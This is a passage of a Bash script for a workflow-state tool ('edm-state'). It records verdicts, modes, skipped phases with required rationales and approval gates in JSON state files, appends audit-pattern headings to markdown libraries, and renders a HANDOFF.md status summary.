    # AC9: no third verdict -- only PASS or FAIL are legal closing verdicts.
    case "$closing_verdict" in
      PASS|FAIL) ;;
      *) die "record-partial-verdict close: unknown closing verdict '$closing_verdict' (expected: PASS|FAIL)" ;;
    esac
    [[ -n "$verification_ref" ]] || die "record-partial-verdict close: verification_ref must be non-empty"

    local f lockbase close_result close_kind close_prior_verdict
    f="$(state_file_for "$prefix")"
    lockbase="${f%.json}"
    close_result="$(with_state_lock "$lockbase" _cmd_record_partial_verdict_close_body "$f" "$prefix" "$ticket" "$closing_verdict" "$verification_ref" "$(now_utc)")" || return 1
    close_kind="${close_result%%$'\t'*}"
    close_prior_verdict="${close_result#*$'\t'}"
    if [[ "$close_kind" == "re-closed" ]]; then
      echo "re-closed verdict: $ticket = $closing_verdict (was FAIL) for $prefix; closure history recorded"
    else
      echo "closed verdict: $ticket = $closing_verdict (was ${close_prior_verdict:-PARTIAL}) for $prefix"
    fi
    return 0
  fi

  # ---- Existing open/record path (unchanged, AC6) --------------------------------------------
  local verdict="$verdict_or_close" note="${4:-}"
  case "$verdict" in
    PASS|PARTIAL|FAIL) ;;
    *) die "record-partial-verdict: unknown verdict '$verdict' (expected: PASS|PARTIAL|FAIL)" ;;
  esac
  rmw_state "$prefix" \
    '.partial_verdict_map[$tk] as $existing
     | .partial_verdict_map[$tk] = (
         if $existing == null then
           {verdict: $v, note: $n, recorded_at: $ts}
         elif ($existing | has("closing_verdict")) then
           {verdict: $v, note: $n, recorded_at: $ts, prior: $existing}
         else
           {verdict: $v, note: $n, recorded_at: $ts}
         end
       )
     | .last_updated = $ts' \
    --arg tk "$ticket" --arg v "$verdict" --arg n "$note" --arg ts "$(now_utc)"
  echo "recorded verdict: $ticket = $verdict for $prefix"
}

# ---- Mode management (T83) ---------------------------------------------------
# set-mode <PREFIX> <kind> <value>
# Kinds: mode (see MODE_ENUM_LIST)
#        lifecycle_mode (see LIFECYCLE_MODE_ENUM_LIST)
#        compliance_enabled (true|false)
#        implementation_mode (standard|tdd)

cmd_set_mode() {
  [[ $# -eq 3 ]] || die "usage: edm-state set-mode <PREFIX> <kind> <value>"
  require_jq
  local prefix="$1" kind="$2" value="$3"
  case "$kind" in
    mode)
      # Word-membership test against the single-source MODE_ENUM_LIST (EDMV3-T07
      # AC5) -- avoids re-declaring the mode enum as a second case-literal list.
      case " $MODE_ENUM_LIST " in
        *" $value "*) ;;
        *) die "set-mode: invalid mode '$value' (expected: ${MODE_ENUM_LIST// /|})" ;;
      esac
      # EDMV3-T07 AC4 remediation: seed skipped_phases on mode CHANGE too, not only at
      # cmd_init creation time -- the new mode's phase graph (default_skipped_phases_json_for_mode)
      # is merged into skipped_phases, deduped by phase. An existing entry for a phase (whether
      # written by a prior mode change, a manual `edm-state skip-phase`, or the initial seed)
      # wins over the incoming default for that same phase -- its rationale is preserved
      # verbatim, never overwritten, so a caller-recorded reason is never silently replaced by a
      # generic mode-derived one.
      local seeded_skipped
      seeded_skipped="$(default_skipped_phases_json_for_mode "$value")"
      rmw_state "$prefix" '
        (.skipped_phases // []) as $existing
        | ($existing | map(.phase)) as $existing_phases
        | .mode = $v
        | .skipped_phases = ($existing + [$seeded[] | select((.phase as $p | $existing_phases | index($p)) == null)])
        | .last_updated = $ts
      ' --arg v "$value" --argjson seeded "$seeded_skipped" --arg ts "$(now_utc)"
      ;;
    lifecycle_mode)
      case " $LIFECYCLE_MODE_ENUM_LIST " in
        *" $value "*) ;;
        *) die "set-mode: invalid lifecycle_mode '$value' (expected: ${LIFECYCLE_MODE_ENUM_LIST// /|})" ;;
      esac
      rmw_state "$prefix" '.lifecycle_mode = $v | .last_updated = $ts' --arg v "$value" --arg ts "$(now_utc)"
      ;;
    compliance_enabled)
      [[ "$value" == "true" || "$value" == "false" ]] \
        || die "set-mode: compliance_enabled requires true|false; got: $value"
      rmw_state "$prefix" '.compliance_enabled = ($v == "true") | .last_updated = $ts' --arg v "$value" --arg ts "$(now_utc)"
      ;;
    implementation_mode)
      case "$value" in
        standard|tdd) ;;
        *) die "set-mode: invalid implementation_mode '$value' (expected: standard|tdd)" ;;
      esac
      rmw_state "$prefix" '.implementation_mode = $v | .last_updated = $ts' --arg v "$value" --arg ts "$(now_utc)"
      ;;
    *)
      die "set-mode: unknown kind '$kind' (expected: mode|lifecycle_mode|compliance_enabled|implementation_mode)"
      ;;
  esac
  echo "set $kind = $value for $prefix"
}

# ---- Phase skip tracking (T96) -----------------------------------------------
# skip-phase <PREFIX> <phase-num> <rationale>
# Records an intentionally skipped phase. Replaces any existing entry for the same phase.
# rationale is required (EDMV3-T62 AC2) -- an empty rationale is refused, a breaking change.

cmd_skip_phase() {
  # EDMV3-T62 AC2 (breaking change, recorded in CHANGELOG.md): rationale is now a required
  # third argument, not an optional one -- `cmd_skip_phase` used to accept `rationale="${3:-}"`
  # and write an empty string. D13(c) removed every override flag; a skip with no rationale was
  # the one remaining way to bypass a check leaving no auditable trail of *why*. Existing state
  # files with a pre-existing empty rationale are read without error (C-4) and surfaced as an
  # EMPTY_SKIP_RATIONALE info anomaly by state_anomalies() below -- this refusal only applies to
  # a NEW skip-phase invocation, never to a file already on disk.
  [[ $# -eq 3 ]] || die "usage: edm-state skip-phase <PREFIX> <phase-num> <rationale>"
  require_jq
  local prefix="$1" phase_num="$2" rationale="$3"
  [[ "$phase_num" =~ ^[1-6]$ ]] || die "skip-phase: phase-num must be 1-6; got: $phase_num"
  [[ -n "$rationale" ]] || die "skip-phase refusing an empty rationale for phase ${phase_num} of ${prefix} -- every skip must record why (EDMV3-94)"
  rmw_state "$prefix" '
    .skipped_phases = (
      [(.skipped_phases // []) | .[] | select(.phase != ($p|tonumber))]
      + [{phase: ($p|tonumber), rationale: $r, skipped_at: $ts}]
    )
    | .last_updated = $ts
  ' --arg p "$phase_num" --arg r "$rationale" --arg ts "$(now_utc)"
  echo "recorded phase $phase_num as skipped for $prefix"
}

# ---- Provenance tracking (T98) -----------------------------------------------
# set-supersedes <PREFIX> <other-prefix>
# set-forked-from <PREFIX> <other-prefix>

cmd_set_supersedes() {
  [[ $# -eq 2 ]] || die "usage: edm-state set-supersedes <PREFIX> <other-prefix>"
  require_jq
  local prefix="$1" other="$2"
  [[ -n "$other" ]] || die "set-supersedes: other-prefix must be non-empty"
  rmw_state "$prefix" '.supersedes = $v | .last_updated = $ts' --arg v "$other" --arg ts "$(now_utc)"
  echo "set supersedes = $other for $prefix"
}

cmd_set_forked_from() {
  [[ $# -eq 2 ]] || die "usage: edm-state set-forked-from <PREFIX> <other-prefix>"
  require_jq
  local prefix="$1" other="$2"
  [[ -n "$other" ]] || die "set-forked-from: other-prefix must be non-empty"
  rmw_state "$prefix" '.forked_from = $v | .last_updated = $ts' --arg v "$other" --arg ts "$(now_utc)"
  echo "set forked_from = $other for $prefix"
}

# ---- Product-line linkage (T101/T102) ----------------------------------------
# resolve-dir <PREFIX> -- resolve bare prefix to initiative directory (read-only).
# Returns a non-zero exit and a message when no initiative exists for the prefix.

cmd_resolve_dir() {
  [[ $# -eq 1 ]] || die "usage: edm-state resolve-dir <PREFIX>"
  local prefix="$1"
  local state_file
  state_file="$(state_file_for "$prefix")"
  [[ -f "$state_file" ]] || die "no initiative for prefix $prefix"
  echo "${state_file%/.edm-state.json}"
}

# set-parent <PREFIX> <PARENT> -- set parent_prefix; validates PARENT exists.
cmd_set_parent() {
  [[ $# -eq 2 ]] || die "usage: edm-state set-parent <PREFIX> <PARENT>"
  require_jq
  local prefix="$1" parent="$2"
  local parent_state
  parent_state="$(state_file_for "$parent")"
  [[ -f "$parent_state" ]] || die "no initiative for prefix $parent"
  rmw_state "$prefix" '.parent_prefix = $p | .last_updated = $t' --arg p "$parent" --arg t "$(now_utc)"
  echo "set parent_prefix = $parent for $prefix"
  write_handoff_internal "$prefix"
}

# add-related <PREFIX> <RELATED> -- append to related_prefixes (idempotent); validates RELATED exists.
cmd_add_related() {
  [[ $# -eq 2 ]] || die "usage: edm-state add-related <PREFIX> <RELATED>"
  require_jq
  local prefix="$1" related="$2"
  local related_state
  related_state="$(state_file_for "$related")"
  [[ -f "$related_state" ]] || die "no initiative for prefix $related"
  rmw_state "$prefix" '
    if (.related_prefixes // []) | contains([$r]) then
      .last_updated = $t
    else
      .related_prefixes = ((.related_prefixes // []) + [$r])
      | .last_updated = $t
    end
  ' --arg r "$related" --arg t "$(now_utc)"
  echo "added $related to related_prefixes for $prefix"
  write_handoff_internal "$prefix"
}

# ---- Artifact lint dispatch (T115) ------------------------------------------
# lint <PREFIX>
# Delegates to edm-lint-artifacts and forwards its exit code.

cmd_lint() {
  [[ $# -eq 1 ]] || die "usage: edm-state lint <PREFIX>"
  command -v edm-lint-artifacts >/dev/null 2>&1 \
    || die "edm-lint-artifacts not found on PATH; ensure the EDM plugin bin/ directory is on PATH"
  edm-lint-artifacts "$1"
}

# ---- Audit pattern library update (T121) -------------------------------------
# update-patterns <PREFIX> <srd|ticket|qc|code|test-coverage>
# Extracts ### headings from the initiative's audit report and inserts novel
# ones into the corresponding docs/audit-patterns/*.md file, under the target
# `##` heading the Living-Library Contract names for the audit type.
# Novel = normalized title not already present as a ### heading in the pattern file.
# Records the action in state (.patterns_updates).

# Living-Library insertion target (EDMV3-T54; docs/audit-patterns/README.md
# Sec."Living-Library Contract", "Insertion target"): a new entry is inserted as a `### ` entry
# under one of the document's four `##` headings, chosen by a documented mapping from finding
# type, with `## Anti-Patterns` as the default target "absent a more specific mapping entry".
# The README documents no per-audit-type mapping row today, so every audit type resolves to the
# default. This case statement is the extension point: adding an arm here REQUIRES adding the
# matching mapping row to the README, because the README is the contract and this is the
# implementation of it -- the two must never disagree.
PATTERN_DEFAULT_TARGET_HEADING="## Anti-Patterns"

# normalize_pattern_titles -- stdin: `### ` headings or bare titles, one per line.
# stdout: the de-duplication key for each, per docs/audit-patterns/README.md Sec."Append Schema"
# ("if the finding title -- lowercased, whitespace-collapsed, trailing-parens metadata stripped
# -- already exists in the document, skip the append").
#
# EVERY trailing "(...)" group is stripped, not just the last one. A library heading carries the
# source finding's own trailing parens PLUS the "(prefix, date, severity)" group this command
# appends, e.g. "### Missing error taxonomy (P1) (PFX, 2026-07-28, P2)". Stripping one group
# leaves "missing error taxonomy (p1)" on the library side against "missing error taxonomy" on
# the report side -- the two never match, so the same finding is re-appended on every run. Both
# sides run through this one filter so they can never drift apart again (EDMV3-T54 idempotence).
normalize_pattern_titles() {
  awk '{
    t = $0
    sub(/^### /, "", t)
    while (match(t, / *\([^()]*\) *$/)) { t = substr(t, 1, RSTART - 1) }
    t = tolower(t)
    gsub(/[ \t][ \t]*/, " ", t)
    sub(/^ /, "", t)
    sub(/ $/, "", t)
    print t
  }'
}

pattern_target_heading_for() {
  case "$1" in
    # srd|ticket|qc|code|test-coverage all take the default target; no more-specific README mapping exists.
    *) printf '%s\n' "$PATTERN_DEFAULT_TARGET_HEADING" ;;
  esac
}

# pattern_insert_line_for <pattern-file> <target-heading>
# Prints the 1-based line number the new entry must be inserted BEFORE, so the entry lands
# inside the target `##` section and never past the document's fourth-section content boundary
# (README.md: "Insertion never lands past the fourth section or at end-of-file"; enforced by
# bin/tests/wave7-smoke.sh's _t56_four_heading_contract_check and by .gitlab-ci.yml's
# lint:pattern-library-contract job, both of which fail on any `###` heading appearing after the
# last `##` section boundary).
#
# Walks forward from the target heading to the next `^## ` line -- that is the section boundary
# -- then backs up over the trailing blank lines and the `---` rule these documents use to
# separate sections, so the entry reads as the last entry OF the target section rather than as a
# stray block glued onto the following heading. When the target section is the document's last
# one there is no following `^## `, so the insertion point is end-of-file; that is legitimate
# because end-of-the-last-section is still inside that section.
#
# Prints 0 when the target heading is absent. Callers must treat 0 as a skip -- never as licence
# to fall back to an end-of-file append.
#
# CA-056: the heading match is fence-aware and refuses ambiguity. A pattern doc documenting its
# own Append Schema by showing an EXAMPLE heading inside a fenced code block would otherwise be a
# plain-text first-match-wins hit -- splicing the new entry into the fenced example instead of the
# real section, unbalancing the fence and corrupting the document. The line-number filtering
# below (via the shared ignored_line_set/is_ignored_line from _edm-lint-lib.sh) requires the
# match to be OUTSIDE any fence, and dies loudly rather than guessing when the heading occurs more
# than once outside fences.
pattern_insert_line_for() {
  local _pf="$1" _heading="$2"
  local _pif_ignored _pif_matches _pif_entry _pif_lineno _pif_start="" _pif_count=0
  _pif_ignored="$(ignored_line_set "$_pf" 2>/dev/null || true)"
  _pif_matches="$(grep -nFx "$_heading" "$_pf" 2>/dev/null || true)"
  while IFS= read -r _pif_entry; do
    [[ -n "$_pif_entry" ]] || continue
    _pif_lineno="${_pif_entry%%:*}"
    is_ignored_line "$_pif_lineno" "$_pif_ignored" && continue
    _pif_count=$((_pif_count + 1))
    [[ -z "$_pif_start" ]] && _pif_start="$_pif_lineno"
  done <<< "$_pif_matches"

  if [[ "$_pif_count" -gt 1 ]]; then
    die "update-patterns: target heading '${_heading}' occurs ${_pif_count} times outside fenced code blocks in ${_pf}; refusing to guess which one is the real section -- make the heading unique before running update-patterns again"
  fi
  if [[ -z "$_pif_start" ]]; then
    echo 0
    return 0
  fi

  awk -v start="$_pif_start" '
    { line[NR] = $0 }
    NR > start && !boundary && /^## / { boundary = NR }
    END {
      if (boundary) { ins = boundary } else { ins = NR + 1 }
      j = ins - 1
      while (j > start && line[j] == "") { j-- }
      if (j > start && line[j] == "---") {
        j--
        while (j > start && line[j] == "") { j-- }
      }
      print j + 1
    }
  ' "$_pf"
}

_render_pattern_entry() {
  local raw_title="$1" prefix="$2" audit_type="$3" today="$4"
  printf '\n'
  printf '### %s (%s, %s, P2)\n\n' "$raw_title" "$prefix" "$today"
  printf 'status: pending-review\n'
  printf 'source: %s\n' "$prefix"
  printf 'audit-type: %s\n' "$audit_type"
  printf 'date: %s\n\n' "$today"
  printf '> Extracted from the %s audit for %s. One-paragraph description of the finding\n' \
    "$audit_type" "$prefix"
  printf '> and how to prevent it -- delimited stub text pending human curation; not yet curated prose.\n'
}

_splice_pattern_file() {
  local pattern_file="$1" insert_line="$2" pending_entries="$3"
  head -n "$((insert_line - 1))" "$pattern_file"
  printf '%s' "$pending_entries"
  tail -n "+${insert_line}" "$pattern_file"
}

_cmd_update_patterns_body() {
  local pattern_file="$1" audit_report_path="$2" target_heading="$3" audit_type="$4" prefix="$5" today="$6"
  local existing_normalized new_findings=0 pending_entries="" raw_heading raw_title lower_title norm insert_line
  # CA-056: the pre-flight duplicate check must ignore any "### " heading that lives inside a
  # fenced code block -- a pattern doc documenting its own Append Schema by showing an EXAMPLE
  # heading in a fence is the concrete case. A fenced example could otherwise mask a real
  # duplicate, or a real heading could be skipped because it happens to textually match content
  # that only exists inside a fence.
  local _cup_fenced_lines _cup_heading_line _cup_heading_lineno _cup_heading_text
  _cup_fenced_lines="$(ignored_line_set "$pattern_file" 2>/dev/null || true)"
  existing_normalized=""
  while IFS= read -r _cup_heading_line; do
    [[ -n "$_cup_heading_line" ]] || continue
    _cup_heading_lineno="${_cup_heading_line%%:*}"
    _cup_heading_text="${_cup_heading_line#*:}"
    is_ignored_line "$_cup_heading_lineno" "$_cup_fenced_lines" && continue
    norm="$(printf '%s\n' "$_cup_heading_text" | normalize_pattern_titles)"
    existing_normalized="${existing_normalized}
${norm}"
  done < <(grep -n '^### ' "$pattern_file" 2>/dev/null || true)

  while IFS= read -r raw_heading; do
    raw_title="${raw_heading#\#\#\# }"
    lower_title="$(echo "$raw_title" | tr '[:upper:]' '[:lower:]' | tr -s ' ')"
    case "$lower_title" in
      "summary"|"findings"|"recommendations"|"overview"|"appendix"|"legend") continue ;;
    esac
    norm="$(printf '%s\n' "$raw_title" | normalize_pattern_titles)"
    [[ -z "$norm" ]] && continue
    if echo "$existing_normalized" | grep -qxF "$norm"; then
      continue
    fi
    pending_entries="${pending_entries}$(_render_pattern_entry "$raw_title" "$prefix" "$audit_type" "$today")"$'\n'
    existing_normalized="${existing_normalized}
${norm}"
    new_findings=$((new_findings + 1))
  done < <(grep '^### ' "$audit_report_path" 2>/dev/null || true)

  if [[ "$new_findings" -gt 0 ]]; then
    insert_line="$(pattern_insert_line_for "$pattern_file" "$target_heading")"
    if [[ -z "$insert_line" || "$insert_line" -eq 0 ]]; then
      echo "update-patterns: target heading '${target_heading}' not found in ${pattern_file}; skipping (nothing appended, no end-of-file fallback)" >&2
      echo 0
      return 0
    fi
    write_atomic "$pattern_file" _splice_pattern_file "$pattern_file" "$insert_line" "$pending_entries" || return 1
  fi

  echo "$new_findings"
}

cmd_update_patterns() {
  [[ $# -eq 2 ]] || die "usage: edm-state update-patterns <PREFIX> <srd|ticket|qc|code|test-coverage>"
  require_jq
  local prefix="$1" audit_type="$2"

  case "$audit_type" in
    srd|ticket|qc|code|test-coverage) ;;
    *) die "update-patterns: unknown audit type '$audit_type' (expected: srd|ticket|qc|code|test-coverage)" ;;
  esac

  # G39: use the existing BASH_SOURCE-derived SCRIPT_DIR global (computed once near the top
  # of this file) instead of re-deriving the plugin root from $0. A local $0-based
  # derivation breaks when this file is sourced rather than executed -- $0 is then the
  # sourcing shell, not this script -- silently resolving outside the plugin.
  local patterns_dir="${SCRIPT_DIR}/../docs/audit-patterns"

  local pattern_file
  case "$audit_type" in
    srd)           pattern_file="${patterns_dir}/srd-audit.md" ;;
    ticket)        pattern_file="${patterns_dir}/ticket-audit.md" ;;
    qc)            pattern_file="${patterns_dir}/qc-audit.md" ;;
    code)          pattern_file="${patterns_dir}/code-audit.md" ;;
    test-coverage) pattern_file="${patterns_dir}/test-coverage-audit.md" ;;
  esac

  # Locate the audit report for this initiative.
  local _dir
  _dir="$(initiative_dir_for "$prefix")"
  local audit_report_path=""
  case "$audit_type" in
    srd)    audit_report_path="${_dir}/audit-srd.md" ;;
    ticket) audit_report_path="${_dir}/${TICKET_PACK_DIRNAME}/audit.md" ;;
    qc)     audit_report_path="${_dir}/qc/qc-summary.md" ;;
    code)
      audit_report_path="$(ls -t "${_dir}/code-audit"/pass-*/REMEDIATION.md 2>/dev/null | head -1 || true)"
      ;;
    test-coverage) audit_report_path="${_dir}/test-coverage.md" ;;
  esac

  if [[ ! -f "$pattern_file" ]]; then
    echo "update-patterns: pattern file not found at ${pattern_file} (skipping)" >&2
    return 0
  fi

  local pattern_dir
  pattern_dir="$(dirname "$pattern_file")"
  if [[ ! -w "$pattern_dir" ]]; then
    echo "update-patterns: pattern directory is not writable at ${pattern_dir} (plugin may be installed read-only; skipping)" >&2
    return 0
  fi

  # Resolve the Living-Library insertion target for this audit type, and verify the document
  # actually carries that heading. A missing target heading is a SKIP, never a fallback: nothing
  # is appended (the file stays byte-identical), the message names both the file and the heading,
  # and the exit status stays 0 because a skip is not an error
  # (docs/audit-patterns/README.md Sec."Living-Library Contract", "Insertion target").
  local target_heading
  target_heading="$(pattern_target_heading_for "$audit_type")"
  if ! grep -qxF "$target_heading" "$pattern_file"; then
    echo "update-patterns: target heading '${target_heading}' not found in ${pattern_file}; skipping (nothing appended, no end-of-file fallback)" >&2
    return 0
  fi

  if [[ -z "${audit_report_path}" || ! -f "$audit_report_path" ]]; then
    echo "update-patterns: no audit report found for ${prefix}/${audit_type} (nothing to append)"
    return 0
  fi

  local new_findings=0 today
  today="$(date -u +"%Y-%m-%d")"
  new_findings="$(with_state_lock "${pattern_file%.md}" _cmd_update_patterns_body "$pattern_file" "$audit_report_path" "$target_heading" "$audit_type" "$prefix" "$today")" \
    || die "update-patterns: failed to update ${pattern_file}"

  # Record in state (.patterns_updates is a new field; safe to add to any existing state file).
  rmw_state "$prefix" '
    .patterns_last_updated = $ts
    | .patterns_updates = ((.patterns_updates // {}) | .[$t] = {updated_at: $ts, new_findings: ($n|tonumber)})
    | .last_updated = $ts
  ' --arg t "$audit_type" --arg ts "$(now_utc)" --arg n "$new_findings"

  if [[ "$new_findings" -gt 0 ]]; then
    echo "update-patterns: ${prefix}/${audit_type} -> ${new_findings} new finding(s) appended to ${pattern_file}"
  else
    echo "update-patterns: ${prefix}/${audit_type} -> no novel findings to append"
  fi
}

# ---- HANDOFF.md generation --------------------------------------------------
# Writes SRD/{PREFIX}/HANDOFF.md - a version-controlled snapshot that any team
# member can read to understand current status and resume the initiative.
# Called automatically from phase-complete, approve-gate, and checkpoint-if-active.
# Preserves the user-editable ## Notes section across re-writes.

write_handoff_internal() {
  local prefix="$1"
  require_jq
  local state_file
  state_file="$(state_file_for "$prefix")"
  [[ -f "$state_file" ]] || return 0

  # CA-027: the Notes-preserving read of HANDOFF.md, the full re-render, and the atomic
  # write are a read-modify-write sequence. Without a lock, two concurrent checkpoints (e.g.
  # a Stop hook firing while an orchestrator command is also mid-checkpoint) can race and one
  # write clobbers the other's freshly-typed Notes prose -- there is no .bak for HANDOFF.md to
  # recover from. Locked on the same lockbase as state mutations so HANDOFF.md writes
  # serialize with them too.
  with_state_lock "${state_file%.json}" _write_handoff_body "$prefix" "$state_file"
}

# _write_handoff_body <prefix> <state-file>   (runs INSIDE with_state_lock; see
# write_handoff_internal above, which acquires the lock and dispatches here)
_write_handoff_body() {
  local prefix="$1"
  local state_file="$2"

  local state
  state="$(cat "$state_file")"

  local phase
  phase="$(echo "$state" | jq -r '(.current_phase // 0) | if type == "number" then floor else 0 end')"

  local phase_name
  phase_name="$(phase_name_for "$phase")"

  local gates_count last_gate
  gates_count="$(echo "$state" | jq -r '(.gates_approved // []) | length')"
  last_gate="$(echo "$state" | jq -r '
    (.gates_approved // []) | .[-1] // null |
    if . then "Gate \(.gate) - approved \(.approved_at) by \(.approver // "unknown")"
    else "none yet"
    end
  ')"

  # Lifecycle & Mode fields (T83, T96, T98, T99) -- empty-safe defaults for pre-T83 state files.
  local mode lifecycle_mode compliance_enabled implementation_mode supersedes forked_from skipped_phases_json
  mode="$(echo "$state" | jq -r '.mode // "standard"')"
  lifecycle_mode="$(echo "$state" | jq -r '.lifecycle_mode // "standard"')"
  compliance_enabled="$(read_bool "$state" "compliance_enabled" "false")"
  implementation_mode="$(echo "$state" | jq -r '.implementation_mode // "standard"')"
  supersedes="$(echo "$state" | jq -r '.supersedes // ""')"
  forked_from="$(echo "$state" | jq -r '.forked_from // ""')"

  # Migration prompt (EDMV3-T10 AC7): schema_version absent -- whether this initiative
  # predates the enforcement kernel or the field was removed by hand from a previously
  # migrated file -- renders here so a silent downgrade is visible, not just in
  # `edm-state validate`'s SCHEMA_VERSION_MISSING anomaly.
  local schema_version_note=""
  if [[ "$(echo "$state" | jq -r '.schema_version // empty')" == "" ]]; then
    schema_version_note="- **Schema**: schema_version not recorded -- run \`edm-state migrate-schema ${prefix}\` to backfill enforcement-kernel compatibility"
  fi

  skipped_phases_json="$(echo "$state" | jq -r '
    (.skipped_phases // []) |
    if length == 0 then ""
    else map("- Phase \(.phase)\(if .rationale != "" then ": \(.rationale)" else "" end)") | join("\n")
    end
  ')"

  # Gate-skip flags (T96): true when the phase feeding a gate is in skipped_phases.
  local gate1_skipped gate2_skipped gate3_skipped
  gate1_skipped="$(echo "$state" | jq -r --argjson p "$(gated_phase_for_gate 1)" '[(.skipped_phases // []) | .[].phase] | contains([$p])')"
  gate2_skipped="$(echo "$state" | jq -r --argjson p "$(gated_phase_for_gate 2)" '[(.skipped_phases // []) | .[].phase] | contains([$p])')"
  gate3_skipped="$(echo "$state" | jq -r --argjson p "$(gated_phase_for_gate 3)" '[(.skipped_phases // []) | .[].phase] | contains([$p])')"

  # Derive what to do next from current phase + gates approved
  local gate_nums next_action
  gate_nums="$(echo "$state" | jq -r '[(.gates_approved // []) | .[].gate] | sort | .[]' 2>/dev/null | tr '\n' ' ')"
  case "$phase" in
    0|1)
      if echo " $gate_nums " | grep -qw 1; then
        next_action="Proceed to Phase 2 - SRD creation (\`/edm:orchestrator ${prefix}\`)"
      elif [[ "$gate1_skipped" == "true" ]]; then
        # ASCII fix (EDMV3-T17 AC7): was a literal U+2014 em dash; HANDOFF.md is a
        # git-committed artifact edm-lint-artifacts class 2 scans.
        next_action="Phase 1 skipped -- run \`/edm:orchestrator ${prefix}\` to continue"
      else
        next_action="HITL Gate 1 pending - run \`/edm:orchestrator ${prefix}\` to present scope for team approval"
      fi
      ;;
    2|3)
      if echo " $gate_nums " | grep -qw 2; then
        next_action="Proceed to Phase 4 - ticket creation (\`/edm:orchestrator ${prefix}\`)"
      elif [[ "$gate2_skipped" == "true" ]]; then
        # ASCII fix (EDMV3-T17 AC7): was a literal U+2014 em dash.
        next_action="Phase 3 skipped -- run \`/edm:orchestrator ${prefix}\` to continue"
      else
        next_action="HITL Gate 2 pending - run \`/edm:orchestrator ${prefix}\` to present SRD for team approval"
      fi
      ;;
    4|5)
      if echo " $gate_nums " | grep -qw 3; then
        next_action="Proceed to Phase 6 - implementation (\`/edm:orchestrator ${prefix}\`)"
      elif [[ "$gate3_skipped" == "true" ]]; then
        # ASCII fix (EDMV3-T17 AC7): was a literal U+2014 em dash.
        next_action="Phase 5 skipped -- run \`/edm:orchestrator ${prefix}\` to continue"
      else
        next_action="HITL Gate 3 pending - run \`/edm:orchestrator ${prefix}\` to present ticket pack for team approval"
      fi
      ;;
    6)
      # Four distinct phase-6 states (EDMV3-T17 AC2), checked most-advanced-first so they
      # are mutually exclusive: ready to archive > awaiting runtime verification of open
      # PARTIALs > awaiting the convergence gate > implementation still in progress.
      # ca_converged_na reads the code_audit_converged boolean set by cmd_approve_gate's
      # code-audit branch, which itself evaluates the shared BLOCKING_FILTER predicate
      # (EDMV3-T28 AC9) -- this Phase-6 next_action rendering is the fourth named consumer of
      # that one definition, not a second re-derivation of the P0/P1/P2 membership test.
      local ca_converged_na ca_enforcement_na open_partials_na phase6_completed_at_na
      ca_converged_na="$(read_bool "$state" "code_audit_converged" "false")"
      ca_enforcement_na="$(echo "$state" | jq -r '.code_audit_gate_enforcement // ""')"
      open_partials_na="$(echo "$state" | jq -r '
        [(.partial_verdict_map // {}) | to_entries[] | select(.value.verdict == "PARTIAL")] | length
      ' 2>/dev/null || echo 0)"
      phase6_completed_at_na="$(echo "$state" | jq -r '.phase_durations["6_phase"].completed_at // ""')"
      if [[ "$ca_converged_na" == "true" || "$ca_enforcement_na" == "CONVERGENCE_NOT_REQUIRED" ]]; then
        next_action="Ready to archive - run \`edm-state archive ${prefix}\`"
      elif [[ "$open_partials_na" -gt 0 ]]; then
        next_action="Phase 6 in progress - awaiting runtime verification of ${open_partials_na} open PARTIAL verdict(s) (see Outstanding PARTIAL Verdicts below)"
      elif [[ -n "$phase6_completed_at_na" ]]; then
        next_action="Awaiting the convergence gate - run \`/edm:code-audit ${prefix}\`, then \`edm-state approve-gate ${prefix} code-audit\`"
      else
        next_action="Phase 6 in progress - run \`/edm:orchestrator ${prefix}\` to continue, then \`/edm:test ${prefix}\` when all tickets pass QC"
      fi
      ;;
    *) next_action="Run \`/edm:orchestrator ${prefix}\` to check status" ;;
  esac

  # Gate list. Numeric gates (gates_approved) render one row each; the two
  # dedicated-boolean gates (Gate 3.5 compliance, code-audit) render as a separate pass
  # rather than being synthesized into gates_approved as fake non-integer members
  # (EDMV3-108 forbids that shape) -- EDMV3-T17 AC1. The `enforcement` tag (EDMV3-T06)
  # documents whether the permission `ask` rules were configured at approval time (see
  # check_permission_rules()); it is omitted, not rendered empty, when absent so a legacy
  # approval predating the field renders cleanly (EDMV3-T06 AC12, C-4).
  local gate_list_numeric
  gate_list_numeric="$(echo "$state" | jq -r '
    (.gates_approved // []) |
    map(
      "- Gate \(.gate) - approved \(.approved_at) by \(.approver // "unknown")"
      + (if (.enforcement // "") != "" then " [enforcement: \(.enforcement)]" else "" end)
    ) | join("\n")
  ')"

  local compliance_gate_row=""
  if [[ "$(read_bool "$state" "compliance_gate_approved" "false")" == "true" ]]; then
    local cg_at cg_approver cg_enf
    cg_at="$(echo "$state" | jq -r '.compliance_gate_approved_at // "unknown"')"
    cg_approver="$(echo "$state" | jq -r '.compliance_gate_approver // "unknown"')"
    cg_enf="$(echo "$state" | jq -r '.compliance_gate_enforcement // ""')"
    compliance_gate_row="- Gate 3.5 (compliance) - approved ${cg_at} by ${cg_approver}"
    [[ -n "$cg_enf" ]] && compliance_gate_row="${compliance_gate_row} [enforcement: ${cg_enf}]"
  fi

  local code_audit_gate_row=""
  local ca_enforcement
  ca_enforcement="$(echo "$state" | jq -r '.code_audit_gate_enforcement // ""')"
  if [[ "$ca_enforcement" == "CONVERGENCE_NOT_REQUIRED" ]]; then
    # Exemption visibility (EDMV3-T17 AC1): this mode's phase graph has no code-audit
    # round -- render the exemption reason rather than a blank or a fabricated approval.
    code_audit_gate_row="- Gate code-audit - not required for this mode [CONVERGENCE_NOT_REQUIRED]"
  elif [[ "$(read_bool "$state" "code_audit_converged" "false")" == "true" ]]; then
    local ca_at ca_approver
    ca_at="$(echo "$state" | jq -r '.code_audit_gate_approved_at // "unknown"')"
    ca_approver="$(echo "$state" | jq -r '.code_audit_gate_approver // "unknown"')"
    code_audit_gate_row="- Gate code-audit - approved ${ca_at} by ${ca_approver}"
    [[ -n "$ca_enforcement" ]] && code_audit_gate_row="${code_audit_gate_row} [enforcement: ${ca_enforcement}]"
  fi

  local gate_list=""
  [[ -n "$gate_list_numeric" ]] && gate_list="${gate_list_numeric}"
  if [[ -n "$compliance_gate_row" ]]; then
    [[ -n "$gate_list" ]] && gate_list="${gate_list}"$'\n'
    gate_list="${gate_list}${compliance_gate_row}"
  fi
  if [[ -n "$code_audit_gate_row" ]]; then
    [[ -n "$gate_list" ]] && gate_list="${gate_list}"$'\n'
    gate_list="${gate_list}${code_audit_gate_row}"
  fi
  [[ -n "$gate_list" ]] || gate_list="_(none yet)_"

  # Artifact presence -- derive paths from the layout resolver (T44).
  local _init_dir
  _init_dir="$(initiative_dir_for "$prefix")"
  local planning_path="${_init_dir}/planning.md"
